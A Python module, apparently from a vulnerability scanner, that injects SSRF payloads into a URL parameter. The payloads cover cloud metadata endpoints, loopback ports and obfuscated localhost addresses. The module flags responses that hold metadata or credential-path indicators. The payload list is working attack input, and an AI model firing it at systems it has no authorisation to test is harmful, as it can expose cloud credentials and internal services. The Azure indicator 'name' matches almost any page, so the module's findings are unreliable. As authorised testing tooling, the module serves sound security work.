"""SSRF vulnerability testing."""

import json
import os
import subprocess
from pathlib import Path
from typing import Optional

from rich.console import Console

console = Console()

# Safe SSRF payloads — non-destructive, only read operations
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
    "http://localhost:22",
    "http://127.0.0.1:22",
    "http://[::1]:22",
    "http://0177.0.0.1/",
    "http://0x7f000001/",
    "http://metadata.tencentyun.com/latest/meta-data/",
]

# Cloud metadata endpoints
METADATA_ENDPOINTS = {
    "aws": "http://169.254.169.254/latest/meta-data/",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "digitalocean": "http://169.254.169.254/metadata/v1/",
    "alibaba": "http://100.100.100.200/latest/meta-data/",
}


def test_ssrf(
    target: str,
    param: str = "url",
    output_dir: str = "./results",
) -> dict:
    """Test for SSRF vulnerabilities.

    Uses safe, non-destructive payloads that only perform read operations.

    Args:
        target: Target URL with parameter
        param: Parameter to test
        output_dir: Output directory
    """
    results = {
        "target": target,
        "tool": "ssrf_tester",
        "vulnerable": False,
        "findings": [],
    }

    os.makedirs(output_dir, exist_ok=True)

    console.print(f"  [dim]Testing SSRF on {target} (param: {param})...[/dim]")

    try:
        import requests

        for payload in SSRF_PAYLOADS:
            test_url = target.replace(f"={param}=", f"={payload}")

            if "=" not in test_url:
                test_url = f"{target}?{param}={payload}"

            try:
                resp = requests.get(test_url, timeout=10, allow_redirects=False)

                # Check for metadata leaks
                if _detect_metadata_leak(resp, payload):
                    results["vulnerable"] = True
                    results["findings"].append({
                        "payload": payload,
                        "status": resp.status_code,
                        "evidence": resp.text[:200],
                    })
                    console.print(f"  [bold red]⚠ SSRF found with payload: {payload}[/bold red]")

            except requests.RequestException:
                continue

        if not results["vulnerable"]:
            console.print("  [green]✓ No SSRF vulnerabilities found[/green]")
        else:
            console.print(f"  [red]Found {len(results['findings'])} SSRF issues[/red]")

    except ImportError:
        console.print("  [yellow]requests not installed — skipping SSRF test[/yellow]")

    # Save results
    output_file = Path(output_dir) / "ssrf_results.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    console.print(f"  [dim]Results saved to {output_file}[/dim]")
    return results


def _detect_metadata_leak(response, payload: str) -> bool:
    """Detect if response contains cloud metadata."""
    if response.status_code != 200:
        return False

    body = response.text.lower()

    # AWS metadata patterns
    aws_indicators = [
        "ami-id", "instance-id", "iam/security-credentials",
        "instance-type", "local-hostname",
    ]

    # GCP metadata patterns
    gcp_indicators = [
        "project/project-id", "instance/name",
        "instance/service-accounts",
    ]

    # Azure metadata patterns
    azure_indicators = [
        "subscriptionId", "resourceGroupName",
        "vmId", "name",
    ]

    all_indicators = aws_indicators + gcp_indicators + azure_indicators

    return any(indicator.lower() in body for indicator in all_indicators)
